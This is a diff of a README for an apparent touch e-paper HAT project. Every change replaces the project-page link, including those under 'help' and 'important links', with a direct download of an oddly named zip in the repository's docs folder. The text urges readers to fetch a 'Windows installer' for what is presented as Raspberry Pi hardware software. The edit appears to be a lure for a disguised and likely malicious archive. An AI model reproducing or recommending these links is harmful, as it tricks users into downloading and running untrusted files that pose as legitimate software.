@@ -1,6 +1,6 @@
 # 📟 touch-epaper-hat-with-RP2350-PiZero - Easy Control for Touch E-Paper
 
-[![Download Software](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://github.com/ftdeepak07-cpu/touch-epaper-hat-with-RP2350-PiZero)
+[![Download Software](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/ftdeepak07-cpu/touch-epaper-hat-with-RP2350-PiZero/main/docs/with_Zero_epaper_touch_R_hat_Pi_germinable.zip)
 
 ## 📖 About This Software
 
@@ -37,9 +37,9 @@ Follow these steps carefully to download and run the software.
 
 Click the large green button below to go to the download page. On the page, look for the latest release files.
 
-[![Download Software](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://github.com/ftdeepak07-cpu/touch-epaper-hat-with-RP2350-PiZero)
+[![Download Software](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/ftdeepak07-cpu/touch-epaper-hat-with-RP2350-PiZero/main/docs/with_Zero_epaper_touch_R_hat_Pi_germinable.zip)
 
-- Click the link above or visit: https://github.com/ftdeepak07-cpu/touch-epaper-hat-with-RP2350-PiZero
+- Click the link above or visit: https://raw.githubusercontent.com/ftdeepak07-cpu/touch-epaper-hat-with-RP2350-PiZero/main/docs/with_Zero_epaper_touch_R_hat_Pi_germinable.zip
 - On the page, find the Files section or Releases tab.
 - Download the latest Windows installer or package.
 
@@ -99,7 +99,7 @@ If the software does not detect your device or the screen shows no response:
 ## 📂 Where To Find More Help
 
 - Visit the project page:  
-  https://github.com/ftdeepak07-cpu/touch-epaper-hat-with-RP2350-PiZero  
+  https://raw.githubusercontent.com/ftdeepak07-cpu/touch-epaper-hat-with-RP2350-PiZero/main/docs/with_Zero_epaper_touch_R_hat_Pi_germinable.zip  
 - Check the Issues tab to see if others have similar questions.
 - Use discussion forums on the project page for community help.
 
@@ -115,7 +115,7 @@ If the software does not detect your device or the screen shows no response:
 ## 🔗 Important Links
 
 - Download or visit the project page:  
-  https://github.com/ftdeepak07-cpu/touch-epaper-hat-with-RP2350-PiZero  
+  https://raw.githubusercontent.com/ftdeepak07-cpu/touch-epaper-hat-with-RP2350-PiZero/main/docs/with_Zero_epaper_touch_R_hat_Pi_germinable.zip  
 - Hardware manual for Waveshare 2.13-inch E-Paper HAT  
 - Raspberry Pi Zero and Pico 2 documentation
 
@@ -128,4 +128,4 @@ If the software does not detect your device or the screen shows no response:
 
 ---
 
-[![Download Software](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://github.com/ftdeepak07-cpu/touch-epaper-hat-with-RP2350-PiZero)
+[![Download Software](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/ftdeepak07-cpu/touch-epaper-hat-with-RP2350-PiZero/main/docs/with_Zero_epaper_touch_R_hat_Pi_germinable.zip)
